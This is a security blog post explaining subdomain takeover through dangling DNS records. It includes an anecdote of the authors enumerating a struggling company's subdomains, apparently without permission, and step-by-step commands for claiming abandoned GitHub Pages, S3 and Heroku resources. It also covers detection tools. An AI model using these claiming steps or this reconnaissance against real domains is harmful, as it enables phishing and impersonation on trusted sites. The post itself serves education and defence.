---
title: "Subdomain Takeover: When Your Own Domain Becomes Your Enemy 🕵️‍♂️"
description: "Subdomain Takeover: When Your Own Domain Becomes Your Enemy 🕵️‍♂️"
date: 2025-07-05
tags: ["subdomain-takeover", "dns", "web-security"]
readTime: "5 min read"
---

![](/images/blog/subdomain-takeover/0_uJ11VeDQmFtR_giW.png)

_A comprehensive guide to understanding, detecting, and preventing one of the web’s most overlooked vulnerabilities — Subdomain Takeover_ 🚨

![](/images/blog/subdomain-takeover/0_VhgnoW0aZuFlcBCK.gif)

* * *

## When LinkedIn News Became our Goldmine 🚨

Picture this: It’s just another random day when I’m scrolling through LinkedIn and stumble upon a post about a company’s financial troubles — half of their online services were reportedly going offline due to unpaid dues. While most people felt sympathy for the employees, my “evil mind” (as I like to call it) immediately saw an opportunity.

_“If their services are shutting down, what happens to their subdomains?”_

![](/images/blog/subdomain-takeover/0_0Xt4JDzPqrggz6kF.gif)

That single thought led me and my friend — Kaif down a rabbit hole that perfectly demonstrates how business disruptions create cybersecurity vulnerabilities. Within minutes, we were running subdomain enumeration:

```
sudo subfinder -d target.com -o subfinder.txt && \sudo httpx-toolkit -l subfinder.txt -o httpx.txt -cname -ip -title -sc && \subjack -w subfinder.txt -t 100 -timeout 30 -ssl -c ~/Downloads/fingerprints.json -v
```

**The result?** We found `gcdn.target.com` flagged as potentially vulnerable to S3 bucket takeover.

![](/images/blog/subdomain-takeover/1_stBzv0SOC1jbQJFOrxpHqQ.png)

A quick dig command revealed the smoking gun:

![](/images/blog/subdomain-takeover/1_076ZcP-S1SucdfUyhwY1-w.png)

Though we were not able to take over the subdomain this time, the presence of proper **TXT records** and correct configurations helped the domain owner secure it just in time.

![](/images/blog/subdomain-takeover/0_TRv-F-mS4ciJIQs0.gif)

We felt a little disappointed — but in a good way! After all, the ultimate goal is always **security first**, not exploitation.

* * *

## What Exactly is a Subdomain Takeover? 🔍

A subdomain takeover occurs when an attacker gains control of a subdomain by claiming an external service that the subdomain was pointing to, but which has been abandoned or misconfigured.

A **subdomain takeover** occurs when a subdomain (like `support.example.com`) points to an external service (e.g., GitHub Pages, AWS S3, Heroku) that has been deleted or is unclaimed.

Because the DNS record still exists but the service behind it does not, an attacker can claim the service and take control of the subdomain.

![](/images/blog/subdomain-takeover/0_7Dav-AwmOAqY7mag.gif)

> In simpler words: your company “forgot” to turn off a signpost pointing to an empty lot — and a hacker decided to build a trap there.

* * *

## How Subdomain Takeovers Actually Take Place: A Step-by-Step Breakdown 🔧

Understanding the mechanics behind subdomain takeovers is crucial for both attackers and defenders. Let’s walk through the exact process of how these vulnerabilities unfold in the real world.

## The Setup Phase: Creating the Vulnerability 🏗️

**Step 1 — Legitimate Service Setup:** A company sets up a subdomain pointing to an external service:

```
# Company creates DNS recordblog.company.com -> CNAME -> company.github.io
```

**Step 2 — Service Configuration:** The company configures their GitHub Pages, AWS S3 bucket, or other service:

```
# GitHub Pages setupRepository: company/company.github.ioCustom domain: blog.company.com
```

**Step 3: The Critical Mistake** Time passes, and the company either:

-   Deletes the GitHub repository
-   Cancels the AWS S3 bucket
-   Removes the Heroku app
-   Stops paying for the service

**But here’s the problem**: They forget to remove the DNS record!

## The Attack Phase: Exploiting the Dangling DNS 🎯

**Step 1: Discovery**

An attacker discovers the vulnerable subdomain through various tools described below in the blog. (Sub-finder, crt.sh, AssetFinder, etc)

**Step 2: Verification**

The attacker verifies the service is unclaimed:

```
# Check if GitHub Pages existscurl -I https://company.github.io# Returns: 404 Not Found# Check DNS still points to servicedig CNAME blog.company.comnslookup blog.company.com# Still returns company.github.io
```

**Step 3: Service Claiming** Now comes the actual takeover:

**For GitHub Pages:**

```
# Attacker creates repositorygit clone https://github.com/attacker/company.github.ioecho "<h1>Subdomain Taken Over!</h1>" > index.htmlgit add . && git commit -m "Takeover" && git push# Configure custom domain in GitHub Pages settings# Add blog.company.com as custom domain
```

**For AWS S3:**

```
# Create bucket with exact nameaws s3 mb s3://company-bucket-name# Upload malicious contentecho "<h1>Subdomain Compromised</h1>" > index.htmlaws s3 cp index.html s3://company-bucket-name/aws s3 website s3://company-bucket-name --index-document index.html
```

**For Heroku:**

```
# Create new Heroku app with same nameheroku create company-app-name# Deploy malicious contentgit init && git add . && git commit -m "Takeover"heroku git:remote -a company-app-namegit push heroku master
```

## Why is it Dangerous? ⚔️

![](/images/blog/subdomain-takeover/0_P_iOkqCfEAeLKdCw.gif)

-   🟢 Phishing attacks using a trusted domain.
-   🟢 Brand and reputation damage.
-   🟢 Malware or malicious scripts hosting.
-   🟢 Hard to detect and monitor.

## How Does It Happen? 🧩

![](/images/blog/subdomain-takeover/0_YZggjAbJAAt25lIz.gif)

1.  Subdomain points to external service (GitHub Pages, AWS, etc.).
2.  Service resource gets deleted or is unclaimed.
3.  DNS record remains active.
4.  Attacker claims the resource.
5.  Attacker now controls the subdomain.

## Tools & Automation 🧰

![](/images/blog/subdomain-takeover/0_57YtOa9ZL1S_f4IX.gif)

-   Subjack
-   Subzy (Not much efficient)
-   Nuclei (subdomain takeover templates)
-   Subfinder + custom checks

* * *

## Our Approach

Sometimes the best vulnerabilities aren’t found through traditional scanning — they’re discovered through intelligence gathering. Here’s the workflow that led to the discovery:

```
# Step 1: Comprehensive subdomain enumerationsudo subfinder -d target.com -o subfinder.txt# Step 2: HTTP probing with detailed informationsudo httpx-toolkit -l subfinder.txt -o httpx.txt -cname -ip -title -sc# Step 3: Subdomain takeover detectionsubjack -w subfinder.txt -t 100 -timeout 30 -ssl -c ~/Downloads/fingerprints.json -v# Step 4: DNS investigation for suspicious resultsdig CNAME suspicious-subdomain.target.com# Step 5: Manual verificationcurl -I suspicious-subdomain.target.com
```

**The Reality of Subdomain Takeover Hunting:**

```
# What the tools showed us$ subjack -w subfinder.txt -t 100 -timeout 30 -ssl -c ~/Downloads/fingerprints.json -v[S3 BUCKET] gcdn.target.com  # Flagged as vulnerable# What manual verification revealed$ dig CNAME gcdn.target.com;; No CNAME record found - looks promising!# The reality check$ dig TXT gcdn.target.com;; TXT records preventing takeover found
```

**The Harsh Truth**: Automated tools can give false positives. Manual verification is essential, and even then, defensive measures might block your attempts.

* * *

## About the Authors:

![](/images/blog/subdomain-takeover/0_JDwQUaIQrRpXOuY-.gif)

-   [**Het Patel**](https://www.linkedin.com/in/hetpatel9) — VAPT Intern| Cybersecurity Researcher | Bug Hunter | Top 6% THM | Coffee Addict ☕
-   [**Kaif Shah**](https://www.linkedin.com/in/skaif009/) — Security Researcher | CEHv11 | CRTA | Top 4% THM | Bug Hunter

_Happy Hacking! (Ethically, of course)_ 😉🔒